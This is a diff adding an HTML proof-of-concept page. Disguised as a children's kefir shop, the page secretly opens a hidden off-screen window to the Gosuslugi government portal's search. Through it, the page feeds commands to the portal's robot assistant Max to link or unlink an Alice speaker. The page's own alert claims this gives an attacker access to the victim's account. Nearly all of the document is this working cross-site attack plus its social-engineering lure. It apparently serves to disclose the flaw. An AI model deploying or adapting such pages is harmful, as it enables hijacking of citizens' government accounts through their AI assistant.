@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8"/>
+    <style>
+        div{
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+        }
+        button {
+            margin: 8px;
+            display: flex;
+            padding: 8px;
+            cursor: pointer;
+            width: 50%;
+        }
+        input{
+            padding: 8px;
+            width: 50%;
+            margin: 8px;
+        }
+        span{
+            color: gray;
+            font-size: 12px;
+            margin: 8px;
+        }
+    </style>
+
+    <script>
+        let openedWindow;
+        let closeTimeout;
+        async function poc (payload) {
+            clearTimeout(closeTimeout);
+            let url = `https://www.gosuslugi.ru/newsearch?query=${encodeURI(payload)}`;
+            if (openedWindow) {
+                openedWindow.location.href = url;
+            } else {
+                openedWindow = window.open(url, '_blank', 'toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=10, height=10, visible=none', '');
+            }
+
+
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    resolve();
+                }, 2000);
+                closeTimeout = setTimeout(() => {
+                    openedWindow?.close();
+                    openedWindow = null;
+                }, 4000);
+            })
+        }
+    </script>
+</head>
+<body>
+
+<div>
+    <h2>Интернет магазин детского кефира</h2>
+    <script>
+        function connectAlisa() {
+            const code = window.document.getElementById('alisaCode').value;
+            poc(code);
+
+
+            alert('Злоумышленник получил доступ к твоим госуслугам через интеграцию робота Макса в колонку Алиса')
+        };
+        async function fastDisconnectAlisa() {
+            await poc('Алиса')
+            await poc('Удалить связь')
+            await poc('Да')
+        }
+    </script>
+    <button onclick="connectAlisa()" style="font-size: 40px">Купить детский кефир</button>
+    <button onclick="fastDisconnectAlisa()">Попробуем заново?</button>
+</div>
+
+
+
+
+
+
+</body>
+</html>
